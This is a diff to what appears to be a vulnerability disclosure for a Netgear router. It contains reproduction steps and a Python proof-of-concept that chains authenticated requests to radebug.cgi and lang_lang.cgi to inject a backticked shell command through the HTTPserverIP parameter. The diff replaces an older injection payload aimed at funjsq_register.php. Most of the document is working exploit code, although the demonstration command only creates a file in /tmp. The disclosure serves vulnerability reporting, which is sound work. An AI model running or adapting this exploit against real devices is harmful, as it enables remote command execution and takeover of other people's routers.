@@ -7,7 +7,7 @@ There is a remote command injection vulnerability in the latest firmware version
 ### Steps to Reproduce
 1.Access the http service of the router for login authentication;
 
-2.On the basis of authentication, you need to construct a POST request to set the parameter "ver_check_https_svr1". Url = 'http://192.168.1.1:8080/radebug.cgi', data = "form=4&serverIP=updates1.netgear.com&HTTPserverIP=`touch%20/tmp/test.txt`&initStartTime=0"
+2.On the basis of authentication, you need to construct a POST request to set the parameter "ver_check_https_svr1". Url = 'http://192.168.1.1:8080/radebug.cgi', data = "form=4&serverIP=updates1.netgear.com&HTTPserverIP=\`touch%20/tmp/test.txt\`&initStartTime=0"
 
 3.After successfully setting the parameter "ver_check_https_svr1", send a POST request "lang_lang.cgi" to the httpd server. Url = 'http://192.168.1.1:8080/lang_lang.cgi', data = "Check=Check"
 
@@ -21,9 +21,10 @@ The screenshot below demonstrates the RCE in the application through the specifi
 ```
 import requests
 import sys
+import re
 
 def attack():
-    # base64(name:passwd)
+    # base64(admin:password)
     base64 = 'YWRtaW46cGFzc3dvcmQ='
     header={
         'Host':'192.168.1.1:80',
@@ -32,21 +33,51 @@ def attack():
         'Connection': 'close',
     }
 
-    data = {
-        "status":"123",
-        "code":"123",
-        "msg":"123",
-        "funjsq_access_token":"`touch /tmp/test.txt`"
-    }
-    urls = 'http://192.168.1.1:80/funjsq_register.php'
+
+    url_1 = 'http://192.168.1.1:80/debug.htm'
     try:
-        ret = requests.post(url=urls,
+        ret_1 = requests.get(url=url_1,
                       headers=header,
-                      json=data,
                       timeout=30,
                       )
     except Exception:
         return
+
+    ##set ver_check_https_svr1(HTTPserverIP)=`touch /tmp/test.txt`
+    url_2 = re.search(r'radebug.cgi\?id=.* ', ret_1.text).group()
+
+    try:
+        ret_2 = requests.post(url= "http://192.168.1.1:80/" + url_2[:-1],
+                      headers=header,
+                      data="form=4&serverIP=updates1.netgear.com&HTTPserverIP=`touch /tmp/test.txt`&initStartTime=0",
+                      timeout=30,
+                      )
+    except Exception:
+        return
+
+    url_3 = 'http://192.168.1.1:80/LANG_lang.htm'
+
+    try:
+        ret_3 = requests.get(url= url_3,
+                      headers=header,
+                      timeout=30,
+                      )
+    except Exception:
+        return
+
+    url_4 = re.search(r'lang_lang.cgi\?id=.*\"', ret_3.text).group()
+
+    ##execute commands '`touch /tmp/test.txt`'
+    try:
+        ret_4 = requests.post(url= "http://192.168.1.1:80/" + url_4[:-1],
+                      headers=header,
+                      data="Check=Check",
+                      timeout=30,
+                      )
+    except Exception:
+        return
+
+
 
 if __name__ == "__main__":
     attack()
